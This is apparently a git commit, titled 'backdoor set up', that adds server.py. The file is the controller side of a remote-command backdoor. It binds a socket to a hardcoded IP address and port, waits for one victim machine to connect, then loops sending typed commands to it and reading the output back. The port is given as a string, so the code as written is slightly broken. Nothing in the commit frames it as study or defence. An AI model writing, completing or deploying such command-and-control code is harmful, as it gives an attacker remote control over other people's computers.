b823018e5647c44fe5224d28a7dcaab6b91ccbd0
d-armendariz88 <inkblotter7@yahoo.com>
2024-01-29 18:02:33 -0800

    backdoor
    backdoor set up

---
+++ server.py
@@ -0,0 +1,15 @@
+import socket
+
+HOST ='50.46.168.136'
+PORT ='8081'
+server = socket.socket()
+server.bind((HOST,PORT))
+server.listen(1)
+client, client_addr = server.accept()
+
+while True:
+    command = input('enter command: ')
+    command = command.encode()
+    client.send(command)
+    output = client.recv(1024)
+    output = output.decode()
